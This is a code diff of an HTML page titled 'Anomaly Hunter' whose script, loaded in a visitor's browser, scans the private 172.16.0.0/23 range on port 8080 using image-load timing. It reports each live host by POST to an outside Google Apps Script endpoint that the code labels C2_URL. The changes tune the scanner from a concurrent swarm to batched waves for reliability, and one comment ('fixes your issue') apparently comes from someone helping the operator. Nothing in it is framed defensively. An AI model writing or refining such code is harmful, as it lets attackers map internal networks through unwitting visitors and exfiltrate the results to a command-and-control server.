@@ -1,153 +1,159 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Anomaly Hunter // Async Swarm</title>
+    <title>Anomaly Hunter // Stable Wave</title>
     <style>
-        body { background: #0d0d0d; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
-        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin-bottom: 10px; animation: flash 0.5s; }
+        body { background: #050505; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; }
+        .success-box { border: 2px solid #0f0; background: #002200; padding: 15px; margin-bottom: 10px; box-shadow: 0 0 10px #0f0; }
         .stat-line { border-bottom: 1px solid #333; padding: 5px 0; color: #666; display: flex; justify-content: space-between; }
         .highlight { color: #fff; font-weight: bold; }
-        #progress-bar { height: 4px; background: #333; margin-top: 10px; width: 100%; }
-        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.1s; }
-        @keyframes flash { 0% { background-color: #0f0; color: #000; } 100% { background-color: #002200; color: #0f0; } }
+        #progress-container { width: 100%; background: #222; height: 10px; margin-top: 15px; }
+        #progress-fill { height: 100%; background: #0f0; width: 0%; transition: width 0.2s; }
+        .grid-log { display: grid; grid-template-columns: repeat(auto-fill, minmax(60px, 1fr)); gap: 2px; margin-top: 10px; font-size: 10px; color: #333; }
+        .dead { color: #333; }
+        .live { color: #0f0; font-weight: bold; background: #001100; }
     </style>
 </head>
 <body>
-    <h3>// ANOMALY HUNTER [SWARM MODE] //</h3>
+    <h3>// ANOMALY HUNTER [STABLE WAVE] //</h3>
     
     <div class="stat-line">
-        <span>TARGET SCOPE:</span>
-        <span class="highlight">172.16.0.0/23 (Randomized)</span>
+        <span>TARGET:</span> <span class="highlight">172.16.0.0/23</span>
     </div>
     <div class="stat-line">
-        <span>STRATEGY:</span>
-        <span class="highlight">Img-Tag Timing (Non-Blocking)</span>
+        <span>STRATEGY:</span> <span class="highlight">Pulsed Blocks (Anti-Exhaustion)</span>
+    </div>
+    <div class="stat-line">
+        <span>STATUS:</span> <span id="status" class="highlight">Initializing...</span>
     </div>
 
-    <br>
-    <div id="status">INITIALIZING SWARM...</div>
-    <div id="progress-bar"><div id="progress-fill"></div></div>
-    <br>
+    <div id="progress-container"><div id="progress-fill"></div></div>
     
-    <div id="results"></div>
+    <div id="results" style="margin-top:20px;"></div>
+    
+    <div id="scan-grid" class="grid-log"></div>
 
     <script>
         // --- CONFIGURATION ---
         var TARGET_PORT = 8080;
-        var TIMEOUT = 1500;    // Allow plenty of time for dead hosts to time out naturally
-        var CONCURRENCY = 15;  // Higher concurrency is safe with Randomization
+        var BATCH_SIZE = 10;     // Small batch size prevents socket clogging
+        var TIMEOUT_MS = 300;    // Fail fast! 300ms is plenty for LAN (usually <20ms)
         var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec";
 
-        // --- PREPARE TARGETS ---
+        // --- SETUP QUEUE ---
         var queue = [];
         [0, 1].forEach(subnet => {
             for(var i=1; i<255; i++) queue.push("172.16." + subnet + "." + i);
         });
 
-        // FISHER-YATES SHUFFLE (CRITICAL FIX)
-        // This ensures we hit 1.40 early roughly 50% of the time, 
-        // rather than waiting for 300 dead IPs to timeout first.
+        // Fisher-Yates Shuffle (Randomize scan order)
         for (let i = queue.length - 1; i > 0; i--) {
             const j = Math.floor(Math.random() * (i + 1));
             [queue[i], queue[j]] = [queue[j], queue[i]];
         }
 
-        var total = queue.length;
-        var completed = 0;
-        var activeRequests = 0;
+        var totalTargets = queue.length;
+        var processedCount = 0;
 
-        // --- SCANNER LOGIC ---
-        function scanNext() {
-            if(queue.length === 0) return;
-            if(activeRequests >= CONCURRENCY) return;
+        // --- SCAN ENGINE ---
+        async function runScan() {
+            document.getElementById('status').innerText = "Running Wave Sequence...";
+            
+            // Process the queue in chunks (Waves)
+            while(queue.length > 0) {
+                // 1. Slice off a batch
+                var batch = queue.splice(0, BATCH_SIZE);
+                
+                // 2. Execute Batch in Parallel
+                // We await the ENTIRE batch. This is the synchronization point that fixes your issue.
+                // The browser is forced to resolve these 10 before requesting more.
+                await Promise.all(batch.map(ip => checkTarget(ip)));
 
-            var ip = queue.shift();
-            activeRequests++;
-            
-            checkIP(ip).then(() => {
-                activeRequests--;
-                updateProgress();
-                scanNext(); // Keep the chain alive
-            });
-            
-            scanNext(); // Spawn more if concurrency allows
+                // 3. Update UI
+                processedCount += batch.length;
+                var pct = (processedCount / totalTargets) * 100;
+                document.getElementById('progress-fill').style.width = pct + "%";
+                document.getElementById('status').innerText = "Scanning: " + processedCount + "/" + totalTargets;
+
+                // 4. Tiny cooldown to allow GC/UI thread to breathe
+                await new Promise(r => setTimeout(r, 20)); 
+            }
+
+            document.getElementById('status').innerText = "SCAN COMPLETE.";
         }
 
-        function checkIP(ip) {
+        function checkTarget(ip) {
             return new Promise(resolve => {
                 var start = performance.now();
                 var img = new Image();
                 var isDone = false;
 
-                // WRAPPER to handle the result
+                // Handler for completion
                 var finish = (status) => {
                     if(isDone) return;
                     isDone = true;
                     var time = Math.round(performance.now() - start);
 
-                    // LOGIC: 
-                    // Dead IPs (Timeout) = >200ms (usually 1000ms+)
-                    // Live IPs (404/200) = <100ms (Your manual check was 6ms)
+                    // LOGIC: LAN hits are usually <20ms. 
+                    // We accept anything under 150ms as "Live/Anomaly" compared to the 300ms timeout.
                     if(time < 150) {
-                        reportHit(ip, time);
+                        reportSuccess(ip, time);
+                        updateGrid(ip, true);
+                    } else {
+                        updateGrid(ip, false);
                     }
-                    
-                    // Cleanup to free socket
+
+                    // Cleanup memory explicitly
+                    img.onload = null;
+                    img.onerror = null;
                     img.src = "";
                     img = null;
+                    
                     resolve();
                 };
 
-                // IMAGE EVENTS
-                // Note: Both onload and onerror mean the port is OPEN/REACHABLE.
-                // A closed port (RST) or Stealth (Timeout) will fire onerror,
-                // but usually with different timing.
-                // However, on 'file://', PNA might block onload. 
-                // We rely purely on the SPEED of the failure.
                 img.onload = () => finish("load"); 
-                img.onerror = () => finish("error");
+                img.onerror = () => finish("error"); // 404/RST triggers this rapidly
 
-                // TRIGGER
-                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
-
-                // SAFETY TIMEOUT (For truly dead/stealth hosts)
+                // HARD TIMEOUT
+                // If the browser is queuing, this clock keeps ticking. 
+                // By enforcing this, we kill "pending" requests that are stuck in the queue.
                 setTimeout(() => {
                     if(!isDone) finish("timeout");
-                }, TIMEOUT);
+                }, TIMEOUT_MS);
+
+                // Trigger Request
+                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
             });
         }
 
         // --- REPORTING ---
-        function reportHit(ip, latency) {
+        function reportSuccess(ip, time) {
             var div = document.createElement("div");
             div.className = "success-box";
-            div.innerHTML = "<strong>>> ANOMALY DETECTED:</strong> " + ip + " <span style='float:right'>" + latency + "ms</span>";
+            div.innerHTML = "<strong>>> TARGET ACQUIRED:</strong> " + ip + 
+                          " <span style='float:right; color:#fff'>" + time + "ms</span>";
             document.getElementById('results').appendChild(div);
-
-            // Exfil
+            
+            // Send to C2
             fetch(C2_URL, {
                 method: "POST", mode: "no-cors",
                 headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ type: "HIT", ip: ip, ms: latency, date: new Date() })
+                body: JSON.stringify({ type: "HIT", ip: ip, ms: time, timestamp: new Date() })
             });
         }
 
-        function updateProgress() {
-            completed++;
-            var pct = (completed / total) * 100;
-            document.getElementById('progress-fill').style.width = pct + "%";
-            document.getElementById('status').innerText = "SCANNING: " + completed + "/" + total;
-            
-            if(completed >= total) {
-                document.getElementById('status').innerText = "SCAN COMPLETE.";
-                if(document.getElementById('results').children.length === 0) {
-                    document.getElementById('results').innerHTML = "<div style='color:#666'>No targets found matching timing profile (<150ms).</div>";
-                }
-            }
+        function updateGrid(ip, isLive) {
+            // Visual feedback for the "matrix" effect
+            var span = document.createElement("div");
+            // Just show last octet for space
+            span.innerText = ip.split('.')[3];
+            span.className = isLive ? "live" : "dead";
+            document.getElementById('scan-grid').appendChild(span);
         }
 
-        // START
-        scanNext();
+        // Start
+        setTimeout(runScan, 500);
 
     </script>
 </body>
